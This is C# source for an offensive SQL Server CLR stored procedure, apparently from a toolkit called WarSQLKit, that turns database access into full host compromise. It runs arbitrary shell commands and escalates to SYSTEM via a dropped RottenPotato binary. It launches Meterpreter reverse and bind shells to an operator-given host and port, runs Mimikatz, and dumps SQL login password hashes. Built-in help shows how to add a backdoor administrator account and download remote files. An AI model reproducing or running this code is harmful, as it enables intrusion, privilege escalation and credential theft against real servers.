using System;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.SqlServer.Server;
using WarSQLKit;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void CmdExec(string cmd)
    {
        SqlContext.Pipe.Send("Command is running, please wait.");
        if (!cmd.Contains("sp_") && !cmd.Contains("/RunSystemPriv") && !cmd.Contains("/RunSystemPS"))
        {
            SqlContext.Pipe.Send(RunCommand("cmd.exe", " /c " + cmd));
        }
        if (cmd.Contains("/RunSystemPS"))
        {
            try
            {
                if (!File.Exists("C:\\ProgramData\\Kumpir.exe"))
                {
                    SqlContext.Pipe.Send("Creating Kumpir File");
                    var createKumpir = new CreateKumpir();
                    createKumpir.KumpirBytes();
                }
                var newCmd = cmd.Replace("/RunSystemPS", "");
                var newCmdReplace = newCmd.Remove(newCmd.Length - 1);
                SqlContext.Pipe.Send("Running PowerShell command with \"NT AUTHORITY\\SYSTEM\" rights");
                RunSystemPS("cmd.exe", " /c C:\\ProgramData\\Kumpir.exe " + "\"" + newCmdReplace + "\"");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
            finally
            {
                File.Delete("C:\\ProgramData\\Kumpir.exe");
            }
        }
        if (cmd.Contains("/RunSystemPriv"))
        {
            try
            {
                if (!File.Exists("C:\\ProgramData\\Kumpir.exe"))
                {
                    SqlContext.Pipe.Send("Creating Kumpir File");
                    var createKumpir = new CreateKumpir();
                    createKumpir.KumpirBytes();
                    SqlContext.Pipe.Send("Dosya Oluþturuldu");
                }
                var newCmd = cmd.Replace("/RunSystemPriv", "");
                var newCmdReplace = newCmd.Remove(newCmd.Length - 1);
                SqlContext.Pipe.Send("Running command with \"NT AUTHORITY\\SYSTEM\" rights");
                RunSystemPriv("cmd.exe", " /c C:\\ProgramData\\Kumpir.exe " + newCmdReplace);
            }
            catch (Exception e)
            {
                SqlContext.Pipe.Send("Task hataya düþtü" + e.Message);
            }
            finally
            {
                File.Delete("C:\\ProgramData\\Kumpir.exe");
            }
        }
        if (cmd == "sp_Mimikatz")
        {
            if (!File.Exists("C:\\ProgramData\\Kumpir.exe"))
            {
                SqlContext.Pipe.Send("Creating Kumpir File");
                var createKumpir = new CreateKumpir();
                createKumpir.KumpirBytes();
            }
            try
            {
                var mimiBuilder = new MeterpreterBuilder();
                mimiBuilder.SaveMimikatz();
                var getMimikatzLocation = @"C:\ProgramData\MimiPs.exe";
                SqlContext.Pipe.Send("Running PowerShell command with \"NT AUTHORITY\\SYSTEM\" rights");
                RunCommand("cmd.exe",
                    " /c C:\\ProgramData\\Kumpir.exe \"" + getMimikatzLocation +"\"");
                GetMimiLog();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
            finally
            {
                File.Delete("C:\\ProgramData\\Kumpir.exe");
                File.Delete("C:\\ProgramData\\MimiPs.exe");
            }
        }
        if (cmd.Contains("sp_meterpreter_reverse_tcp"))
        {
            if (cmd.Contains("GetSystem"))
            {
                try
                {
                    string[] cmdSplit = cmd.Split(' ');
                    var createKumpir = new CreateKumpir();
                    createKumpir.KumpirBytes();
                    var buildMeterpreter = new MeterpreterBuilder
                    {
                        Ip = cmdSplit[1],
                        Port = cmdSplit[2],
                        IsRunSystemPriv = true
                    };
                    buildMeterpreter.SaveReverseMeterpreter();
                }
                catch (Exception e)
                {
                    SqlContext.Pipe.Send(e.Message);
                }
            }
            else
            {
                try
                {
                    string[] cmdSplit = cmd.Split(' ');
                    var buildMeterpreter = new MeterpreterBuilder
                    {
                        Ip = cmdSplit[1],
                        Port = cmdSplit[2]
                    };
                    buildMeterpreter.SaveReverseMeterpreter();
                }
                catch (Exception e)
                {
                    SqlContext.Pipe.Send(e.Message);
                }
            }
        }
        if (cmd.Contains("sp_x64_meterpreter_reverse_tcp"))
        {
            if (cmd.Contains("GetSystem"))
            {
                try
                {
                    string[] cmdSplit = cmd.Split(' ');
                    var createKumpir = new CreateKumpir();
                    createKumpir.KumpirBytes();
                    var buildMeterpreter = new MeterpreterBuilder
                    {
                        Ip = cmdSplit[1],
                        Port = cmdSplit[2],
                        IsRunSystemPriv = true
                    };
                    buildMeterpreter.Savex64ReverseMeterpreter();
                }
                catch (Exception e)
                {
                    SqlContext.Pipe.Send(e.Message);
                }
            }
            else
            {
                try
                {
                    string[] cmdSplit = cmd.Split(' ');
                    var buildMeterpreter = new MeterpreterBuilder
                    {
                        Ip = cmdSplit[1],
                        Port = cmdSplit[2]
                    };
                    buildMeterpreter.Savex64ReverseMeterpreter();
                }
                catch (Exception e)
                {
                    SqlContext.Pipe.Send(e.Message);
                }
            }
        }
        if (cmd.Contains("sp_meterpreter_reverse_rc4"))
        {
            if (cmd.Contains("GetSystem"))
            {
                try
                {
                    string[] cmdSplit = cmd.Split(' ');

                    var createKumpir = new CreateKumpir();
                    createKumpir.KumpirBytes();
                    var buildMeterpreter = new MeterpreterBuilder
                    {
                        Ip = cmdSplit[1],
                        Port = cmdSplit[2],
                        IsRunSystemPriv = true
                    };
                    buildMeterpreter.SaveMeterpreterRc4();
                }
                catch (Exception e)
                {
                    SqlContext.Pipe.Send(e.Message);
                }
            }
            else
            {
                try
                {
                    string[] cmdSplit = cmd.Split(' ');
                    var buildMeterpreter = new MeterpreterBuilder
                    {
                        Ip = cmdSplit[1],
                        Port = cmdSplit[2]
                    };
                    buildMeterpreter.SaveMeterpreterRc4();
                }
                catch (Exception e)
                {
                    SqlContext.Pipe.Send(e.Message);
                }
            }
        }
        if (cmd.Contains("sp_meterpreter_bind_tcp"))
        {
            try
            {
                string[] cmdSplit = cmd.Split(' ');
                var createKumpir = new CreateKumpir();
                createKumpir.KumpirBytes();
                if (cmd.Contains("GetSystem"))
                {
                    var buildMeterpreter = new MeterpreterBuilder
                    {
                        Port = cmdSplit[1],
                        IsRunSystemPriv = true
                    };
                    buildMeterpreter.SaveBindMeterpreter();
                }
                else
                {
                    var buildMeterpreter = new MeterpreterBuilder { Port = cmdSplit[1] };
                    buildMeterpreter.SaveBindMeterpreter();
                }
            }
            catch (Exception e)
            {
                SqlContext.Pipe.Send(e.Message);
            }
        }
        if (cmd == "sp_getSqlHash")
        {
            GetSqlHash();
        }
        if (cmd == "sp_getProduct")
        {
            GetProduct();
        }
        if (cmd == "sp_getDatabases")
        {
            GetDatabases();
        }
        if (cmd.Contains("sp_downloadFile"))
        {
            var spliter = cmd.Split(' ');
            var downloadFile = new FileDownloader(spliter[1], spliter[2]);
            downloadFile.StartDownload(Int32.Parse(spliter[3]));
            RunCommand("cmd.exe", " /c dir " + spliter[2]);
        }
        if (cmd == "sp_help")
        {
            SqlContext.Pipe.Send("WarSQLKit Command Example");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'whoami'; => Any Windows command");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'whoami /RunSystemPriv'; => Any Windows command with NT AUTHORITY\\SYSTEM rights");
            SqlContext.Pipe.Send("EXEC sp_cmdExec '\"net user eyup P@ssw0rd1 /add\" /RunSystemPriv'; => Adding users with RottenPotato (Kumpir)");
            SqlContext.Pipe.Send("EXEC sp_cmdExec '\"net localgroup administrators eyup /add\" /RunSystemPriv'; => Adding user to localgroup with RottenPotato (Kumpir)");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'powershell Get-ChildItem /RunSystemPS'; => (Powershell) with RottenPotato (Kumpir)");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'sp_meterpreter_reverse_tcp LHOST LPORT GetSystem'; => x86 Meterpreter Reverse Connection with  NT AUTHORITY\\SYSTEM");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem'; => x64 Meterpreter Reverse Connection with  NT AUTHORITY\\SYSTEM");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem'; => x86 Meterpreter Reverse Connection RC4 with  NT AUTHORITY\\SYSTEM, RC4PASSWORD=warsql");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'sp_meterpreter_bind_tcp LPORT GetSystem'; => x86 Meterpreter Bind Connection with  NT AUTHORITY\\SYSTEM");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'sp_Mimikatz'; "+ Environment.NewLine + "select * from WarSQLKitTemp => Get Mimikatz Log. Thnks Benjamin Delpy :)");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'sp_downloadFile http://eyupcelik.com.tr/file.exe C:\\ProgramData\\file.exe 300';  => Download File");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'sp_getSqlHash';  => Get MSSQL Hash");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'sp_getProduct';  => Get Windows Product");
            SqlContext.Pipe.Send("EXEC sp_cmdExec 'sp_getDatabases';  => Get Available Database");
        }
    }
    public static string RunCommand(string filename, string arguments)
    {
        var process = new Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }

        if (process.ExitCode == 0)
        {
            SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();

            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }

            if (stdOutput.Length != 0)
            {
                message.AppendLine("Std output:");
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);
        }
        return stdOutput.ToString();
    }
    public static void RunSystemPriv(string filename, string arguments)
    {
        var process = new Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data); 
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }

        if (process.ExitCode == 0)
        {
            SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();

            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }

            if (stdOutput.Length != 0)
            {
                message.AppendLine("Std output:");
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(filename + arguments + " finished with exit code =" + process.ExitCode + ": " + message);
        }
    }
    public static void RunSystemPS(string filename, string arguments)
    {
        var process = new Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send(e.Message);
        }

        if (process.ExitCode == 0)
        {
            SqlContext.Pipe.Send(stdOutput.ToString());
        }
        else
        {
            var message = new StringBuilder();

            if (!string.IsNullOrEmpty(stdError))
            {
                message.AppendLine(stdError);
            }

            if (stdOutput.Length != 0)
            {
                message.AppendLine("Std output:");
                message.AppendLine(stdOutput.ToString());
            }
            SqlContext.Pipe.Send(filename + arguments + " finished with exit code = " + process.ExitCode + ": " + message);
        }
    }
    public static void GetSqlHash()
    {
        using (SqlConnection connection = new SqlConnection("context connection=true"))
        {
            var result = string.Empty;
            connection.Open();
            var command = new SqlCommand("SELECT name, password_hash FROM master.sys.sql_logins", connection);
            var reader = command.ExecuteReader();

            using (reader)
            {
                while (reader.Read())
                {
                    string value = string.Empty;
                    byte[] b = null;
                    b = (byte[])reader[1];
                    var hex = BitConverter.ToString(b);
                    var hexCode = hex.Replace("-", "");

                    value = reader[0].ToString() + " : " + hexCode;
                    result += string.Format("{0}{1}", Environment.NewLine, value);
                }
            }
            SqlContext.Pipe.Send(result);
        }
    }
    public static void GetProduct()
    {
        using (SqlConnection connection = new SqlConnection("context connection=true"))
        {
            var exploitCode = @"DECLARE @RegLoc VARCHAR(100)";
            exploitCode += Environment.NewLine + @"select @RegLoc='SOFTWARE\Microsoft\Windows NT\CurrentVersion'";
            exploitCode += Environment.NewLine + @"EXEC [master].[dbo].[xp_regread]";
            exploitCode += Environment.NewLine + @"@rootkey='HKEY_LOCAL_MACHINE',";
            exploitCode += Environment.NewLine + @"@key=@RegLoc,";
            exploitCode += Environment.NewLine + @"@value_name='ProductName'";
            var result = string.Empty;
            connection.Open();
            var command = new SqlCommand(exploitCode, connection);
            var reader = command.ExecuteReader();

            using (reader)
            {
                while (reader.Read())
                {
                    result += string.Format("{0}{1}", Environment.NewLine, reader[1]);
                }
            }
            SqlContext.Pipe.Send(result);
        }
    }
    public static void GetDatabases()
    {
        using (SqlConnection connection = new SqlConnection("context connection=true"))
        {
            var exploitCode = "select name from master..sysdatabases";
            var result = string.Empty;
            connection.Open();
            var command = new SqlCommand(exploitCode, connection);
            var reader = command.ExecuteReader();

            using (reader)
            {
                while (reader.Read())
                {
                    result += string.Format("{0}{1}", Environment.NewLine, reader[0]);
                }
            }
            SqlContext.Pipe.Send(result);
        }
    }
    public static void GetMimiLog()
    {
        using (SqlConnection connection = new SqlConnection("context connection=true"))
        {
            try
            {
                var cmd = new SqlCommand();
                cmd.Connection = connection;
                cmd.CommandText = "IF OBJECT_ID('WarSQLKitTemp')IS NOT NULL DROP TABLE WarSQLKitTemp" + Environment.NewLine + "CREATE TABLE dbo.WarSQLKitTemp(mimiLog text);";
                connection.Open();
                cmd.ExecuteNonQuery();
                connection.Close();
            }
            catch (Exception e)
            {
                SqlContext.Pipe.Send(e.Message);
            }
            try
            {
                string mimiLogStr = File.ReadAllText(@"C:\ProgramData\mimi.log");
                var cmd2 = new SqlCommand();
                cmd2.Connection = connection;
                cmd2.CommandText = "insert into WarSQLKitTemp(mimiLog) values(@mimiLog)";
                var dbp = new SqlParameter("@mimiLog", SqlDbType.Text);
                dbp.Value = mimiLogStr;
                cmd2.Parameters.Add(dbp);
                connection.Open();
                cmd2.ExecuteNonQuery();
                connection.Close();

            }
            catch (SqlException exp)
            {
                SqlContext.Pipe.Send(exp.Message);
            }
            SqlContext.Pipe.Send("Bravo, Mimikatz Log Saved! Please run \"select * from WarSQLKitTemp\"");
        }
    }
}
